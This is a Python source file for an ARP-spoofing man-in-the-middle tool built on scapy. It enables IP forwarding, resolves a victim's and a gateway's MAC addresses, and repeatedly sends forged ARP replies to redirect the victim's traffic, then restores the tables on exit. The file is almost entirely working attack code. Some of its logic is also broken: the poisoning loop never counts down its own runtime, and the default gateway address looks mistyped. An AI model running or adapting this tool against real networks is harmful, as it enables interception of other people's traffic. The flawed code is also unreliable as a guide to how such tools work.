
"""
 Copyright (c) 2017, Syslog777

 All rights reserved.

 Redistribution and use in source and binary forms, with or without modification,
 are permitted provided that the following conditions are met:

     * Redistributions of source code must retain the above copyright notice,
       this list of conditions and the following disclaimer.
     * Redistributions in binary form must reproduce the above copyright notice,
       this list of conditions and the following disclaimer in the documentation
       and/or other materials provided with the distribution.
     * Neither the name of Desktop nor the names of its contributors
       may be used to endorse or promote products derived from this software
       without specific prior written permission.

 THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR
 CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
 PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
 LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
 NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
"""
from scapy.all import *

"""
All arguments:
--mitm: total runtime in seconds
-iface: Interface to use for network activity
-vIP: IP of the victim
-gIP: IP of the gate/ node that the victim
-gPN: Port number of the gate to connect to
"""


class Mitm:

    def __init__(self, parser):
        parser.add_argument('runtime', nargs="?", help="Mitm time to run")
        parser.add_argument('-iface', '--interface', dest="interface",
                            required=True, type=str,
                            help="interface to use for network activity")
        parser.add_argument('-vIP', '--victim-ip', help="IP of the victim",
                            dest="victim_ip", required=True, type=str,
                            default="127.0.0.1")
        parser.add_argument('-gIP', '--gate-ip', dest="gate_ip", required=True, type=str,
                            default="196.168.2.1",
                            help="IP of the gate/ node that the victim is connecting to")
        self.enable_forwarding()
        self.args = parser.parse_args()
        self.interface = self.args.interface
        self.victim_ip = self.args.victim_ip
        self.gate_ip = self.args.gate_ip
        self.victim_mac = self.get_mac(self.victim_ip)
        self.gate_mac = self.get_mac(self.gate_ip)
        self.runtime = self.args.runtime

    def enable_forwarding(self):
        print("\n[*] Enabling IP forwarding....\n")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    def disable_forwarding(self):
        print("[*] Disabling IP Forwarding...")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

    def mitm_shutdown(self):
        print("\n[*] Exiting...")
        self.disconnect()
        sys.exit(0)

    def get_mac(self, ip):
        return getmacbyip(ip)

    def re_arp(self):
        try:
            print("\n[*] Restoring Targets...")
            print("\n[*] Sending 7 restorative packets...")
            victim_mac = self.get_mac(self.victim_ip)
            gate_mac = self.get_mac(self.gate_ip)
            sendp(ARP(op=2, pdst=self.gate_ip, psrc=self.victim_ip,
                      hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=7)
            sendp(ARP(op=2, pdst=self.victim_ip, psrc=self.gate_ip,
                      hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gate_mac), count=7)
        except KeyboardInterrupt:
            self.mitm_shutdown()

    def trick(self, gm, vm):
        """
        :param gm: gate mac
        :param vm: victim mac
        :return: None
        """
        sendp(ARP(op=2, pdst=self.victim_ip, psrc=self.gate_ip, hwdst=vm))
        sendp(ARP(op=2, pdst=self.gate_ip, psrc=self.victim_ip, hwdst=gm))

    def disconnect(self):
        self.re_arp()
        self.disable_forwarding()

    def connect(self, runtime=1):
        """
        connection_attempts: total number of attempts to trick the victim
        and the gate
        pause_time: time for mitm to wait before next connection attempt
        """
        try:
            self.victim_mac = self.get_mac(self.victim_ip)
        except Exception:
            print("[!] Couldn't Find Victim MAC Address")
            self.mitm_shutdown()
        try:
            self.gate_mac = self.get_mac(self.gate_ip)
        except Exception:
            print("[!] Couldn't Find Gateway MAC Address")
            self.mitm_shutdown()
        print("[*] Poisoning Targets...")
        while self.runtime > 0:
            try:
                self.trick(self.gate_mac, self.victim_mac)
                runtime = runtime - 1
                time.sleep(1)
            except KeyboardInterrupt:
                self.re_arp()
                break
        self.mitm_shutdown()
